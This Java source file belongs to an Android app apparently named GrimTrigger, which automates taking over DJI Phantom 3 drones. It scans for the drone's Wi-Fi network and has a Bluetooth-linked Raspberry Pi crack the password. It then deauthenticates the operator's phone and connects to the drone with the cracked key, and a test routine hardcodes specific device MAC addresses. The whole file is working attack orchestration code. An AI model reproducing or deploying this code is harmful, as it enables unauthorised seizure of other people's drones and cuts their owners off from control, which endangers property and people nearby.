package com.dke.grimtrigger.grimtrigger;

import android.content.Context;
import android.net.wifi.WifiConfiguration;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import java.util.List;

public class CrackModule implements IModule {

    private String TAG = "CrackModule";
    private Context mContext;
    private Button mCrackButton;
    private WifiModule mWifiModule;
    private BTModule mBTModule;
    private DJIModule mDJIModule;
    private NotificationModule mNotificationModule;

    public String crackedPSK = "NONE_FOUND_CM";
    public String mobileMACAddressToDeauth = "EMPTY";
    public String targetControllerSSID = "EMPTY";
    public String targetControllerMAC = "EMPTY";
    public boolean isCrackedPSKValid = false;

    CrackModule (Context context) {
        mContext = context;
        mWifiModule = new WifiModule(mContext);
        mBTModule = new BTModule(mContext);
        mNotificationModule = new NotificationModule(mContext);
    }

    CrackModule (Context context, Button crackButton) {
        mContext = context;
        mCrackButton = crackButton;
        mWifiModule = new WifiModule(mContext);
        mBTModule = new BTModule(mContext);
        mNotificationModule = new NotificationModule(mContext);
    }

    @Override
    public void Initialize() {
        mWifiModule.Initialize();
        mBTModule.Initialize();
        mNotificationModule.Initialize();
    }

    @Override
    public void Finalize() {
        mWifiModule.Finalize();
        mBTModule.Finalize();
        mNotificationModule.Finalize();
    }

    public void crackDrone() {
        CrackRunnable crackRunnable = new CrackRunnable();
        new Thread(crackRunnable).start();
    }

    public void rebootPi() {
        mBTModule.sendCommand("REBOOT");
    }

    public void shutdownPi() {
        mBTModule.sendCommand("SHUTDOWN");
    }

    public void wakeScreenPi() {
        mBTModule.sendCommand("TESTING--WAKE_SCREEN");
    }

    public void testStartCrack() {
        mBTModule.sendCommand("TESTING--START_CRACK");
    }

    public void toggleMonitorMode(String action) {
        // action is START or STOP
        mBTModule.sendCommand(action + "_MONITOR_MODE");
    }


    public void deauthMobileTarget(String action) {
        if(!mobileMACAddressToDeauth.contains("EMPTY")) {
            mBTModule.sendCommand(action + "_DEAUTH--" + targetControllerMAC + "--" + mobileMACAddressToDeauth);
        } else {
            Log.d("deauthMobileTarget", "Mobile MAC address not obtained yet");
        }
    }

    public void deauthMobileTargetTest(String action) {

        mBTModule.sendCommand(action + "_DEAUTH--" + "60:60:1F:73:BB:C9" + "--" + "40:98:AD:49:76:65"); // 84:51:81:F4:A3:56 matt nexus
    }

    public void connectToControllerWifi(String targetControllerSSID, String crackedPSK) {
        String controllerConnectionStatus = mWifiModule.connectToTargetController(targetControllerSSID, crackedPSK);
        Log.d("CrackModule", "connectToTargetController response " + controllerConnectionStatus);
    }


    private class CrackRunnable implements Runnable {
        @Override
        public void run() {

            // Scan for access points in range.
            mWifiModule.startScan();

            if (mCrackButton != null) {
                mCrackButton.post(new Runnable() {
                    @Override
                    public void run() {
                        mCrackButton.setEnabled(false);
                    }
                });
            }
            if (mCrackButton != null) {
                mCrackButton.post(new Runnable() {
                    @Override
                    public void run() {
                        mCrackButton.setEnabled(false);
                    }
                });
            }

            // Filter results for DJI Phantom 3 drone.
            // Wait for response, times out after 10 seconds.
            for (int i = 0; i < 50; i++) {
                try {Thread.sleep(200);}
                catch (InterruptedException ie) {}
                String targetMAC = mWifiModule.getTargetMAC();
                String targetSSID = mWifiModule.getTargetSSID();
                if (!targetMAC.contains("EMPTY")) {

                    Log.d("CrackModule", "Setting targetControllerMAC to " + targetMAC);
                    targetControllerMAC = targetMAC;
                    if(!targetSSID.contains("EMPTY")) {
                        Log.d(TAG, "Setting targetControllerSSID to " + targetSSID);
                        targetControllerSSID = targetSSID;
                    } else {
                        Log.e(TAG, "Could not set targetControllerSSID, targetSSID contained \"EMPTY\" " + targetSSID);
                    }

                    Log.d(TAG, "Sending crack request");
                    mBTModule.sendCrackRequest(targetMAC);

                    break;
                }
            }

            // Wait for response, times out after 240 seconds.
            for (int i = 0; i < 1200; i++) {
                String response = mBTModule.getResponse(); // (set response string for ease of access)
                boolean isCrackSuccessString;
                crackedPSK = response + " " + String.valueOf(i);

                if(response != null) { // (log waiting and each response sent back)
                    isCrackSuccessString = response.contains("CRACK_SUCCESS");
                    Log.d(TAG, "Waiting for response crackedPSK: " + crackedPSK);
                    if (!mBTModule.getResponseValid() || !isCrackSuccessString) { // (check for crack success before exiting wait loop)
                        try {Thread.sleep(500);}
                        catch (InterruptedException e) {
                            isCrackedPSKValid = false;
                            break;
                        }
                    } else {
                        Log.d(TAG, "About to break out of wait loop on " + String.valueOf(i) + "th iteration");
                        break;
                    }
                } else {
                    try {Thread.sleep(500);}
                    catch (InterruptedException e) {
                        isCrackedPSKValid = false;
                        break;
                    }
                    Log.e("CrackModule", "Waiting for response (response was null) " + String.valueOf(i));
                }

            }

            if (mCrackButton != null) {
                mCrackButton.post(new Runnable() {
                    @Override
                    public void run() {
                        mCrackButton.setEnabled(true);
                        mCrackButton.setText("Start Cracking");
                    }
                });
            }

            String response = mBTModule.getResponse();
            // Flag PSK as valid or not.
            if(response != null) {
                isCrackedPSKValid = (response.contains("RESPONSE_INVALID"));
                crackedPSK = response;
                String notificationMsg = "";
                if(response.contains("CRACK_SUCCESS")) {
                    String[] resArray = response.split("--");
                    crackedPSK = resArray[1];

                    mobileMACAddressToDeauth = resArray[2];
                    notificationMsg = "Crack Success[" + crackedPSK + "] MAC [" + mobileMACAddressToDeauth + "]";

                    mNotificationModule.showNotification(notificationMsg);

                    // Start deauthing the target phone already connected to the drone
                    Log.d(TAG, "At this point should begin deauthing the client mac " + mobileMACAddressToDeauth);

                    deauthMobileTarget("START");

                    /**
                     * After it is verified that the target phone is being deauthenticated,
                     * connect to drone wifi so that DJI SDK functions can be used
                     */
                    Log.d(TAG, "About to connectToTargetController( " + targetControllerSSID + ", " + crackedPSK + " );");

                    // TODO: 10/29/17 Check to see if drone has any clients that are non-DJI clients (the connected phone)
                    // for now, just wait 10 seconds or so
                    try {Thread.sleep(5000);}
                    catch (InterruptedException e) {
                        Log.d("Exception-in-crack","connectToController about to run 4 seconds later" + String.valueOf(e));
                    }
                    Log.d("connect_wifi","connectToController about to run 4 seconds later");

                    String controllerConnectionStatus = mWifiModule.connectToTargetController(targetControllerSSID, crackedPSK);
                    Log.d(TAG, "connectToTargetController response " + controllerConnectionStatus);

                } else {
                    notificationMsg = "No password crack success [ " + crackedPSK + " ]";
                    mNotificationModule.showNotification(notificationMsg);
                }
            }


        }
    }
}
